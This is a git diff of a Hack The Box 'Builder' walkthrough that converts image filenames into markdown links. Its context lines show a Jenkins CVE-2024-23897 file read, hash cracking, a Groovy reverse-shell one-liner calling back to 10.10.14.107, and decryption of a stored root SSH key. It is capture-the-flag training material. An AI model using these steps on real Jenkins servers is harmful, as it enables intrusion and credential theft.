@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Builder.png
+![Builder.png](../assets/builder_assets/Builder.png)
 
 ### Enumeration
 
@@ -42,15 +42,15 @@ Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
 
 Looking at the Jetty site on port 8080 we find a Jenkins 2.441 instance running:
 
-htb_builder_site.png
+![htb_builder_site.png](../assets/builder_assets/htb_builder_site.png)
 
 Navigating to http://10.129.230.220:8080/asynchPeople/ we also find user Jennifer (as well as our anonymous session):
 
-htb_builder_people.png
+![htb_builder_people.png](../assets/builder_assets/htb_builder_people.png)
 
 Clicking into the Credentials tab we see that user root may have SSH enabled:
 
-htb_builder_credentials.png
+![htb_builder_credentials.png](../assets/builder_assets/htb_builder_credentials.png)
 
 Looking for Jenkins exploits I find `CVE-2024-23897(Arbitrary File Read Vulnerability) Jenkins 2.441 and earlier`
 
@@ -80,13 +80,13 @@ We can then execute:
 
 Which gives us the contents of `/etc/passwd`:
 
-htb_builder_passwd.png
+![htb_builder_passwd.png](../assets/builder_assets/htb_builder_passwd.png)
 
 ### Foothold
 
 Lets find the Jenkins home path by viewing `/proc/self/environ`
 
-htb_builder_home.png
+![htb_builder_home.png](../assets/builder_assets/htb_builder_home.png)
 
 We can now confirm that user jennifer exists by viewing `/var/jenkins_home/users/users.xml`
 
@@ -114,11 +114,11 @@ Which gives us a bcyrpt hash:
 
 Lets crack this in john:
 
-htb_builder_john.png
+![htb_builder_john.png](../assets/builder_assets/htb_builder_john.png)
 
 We can now login as jennifer:
 
-htb_builder_in.png
+![htb_builder_in.png](../assets/builder_assets/htb_builder_in.png)
 
 We can now navigate to the `/script` directory and issue a reverse shell using Groovy:
 
@@ -128,7 +128,7 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.107/443;cat <&5 | while 
 p.waitFor()
 ```
 
-htb_builder_script.png
+![htb_builder_script.png](../assets/builder_assets/htb_builder_script.png)
 
 We then catch a shell back as jenkins:
 
@@ -157,13 +157,13 @@ Because the hostname is 0f52c222a4cc, we can likely assume we are inside of a do
 
 We can now grab the user.txt flag in `/var/jenkins_home`
 
-htb_builder_user_flag.png
+![htb_builder_user.png](../assets/builder_assets/htb_builder_user.png)
 
 ### Privilege Escalation
 
 Looking at `/var/jenkins_home/credentials.xml` we find an encrypted key:
 
-htb_builder_enc_key.png
+![htb_builder_enc_key.png](../assets/builder_assets/htb_builder_enc_key.png)
 
 And it appears to be the SSH key for root:
 
@@ -181,7 +181,7 @@ We can decrypt this back in the Groovy Console with:
 println(hudson.util.Secret.decrypt("{AQAAAB.....<SNIP>}"))
 ```
 
-htb_builder_groovy2.png
+![htb_builder_groovy2.png](../assets/builder_assets/htb_builder_groovy2.png)
 
 We can then use this key to SSH in as root:
 
@@ -211,7 +211,7 @@ builder
 
 We can now grab the root.txt flag:
 
-htb_builder_root_flag.png
+![htb_builder_root_flag.png](../assets/builder_assets/htb_builder_root_flag.png)
 
 Thanks for following along!
 
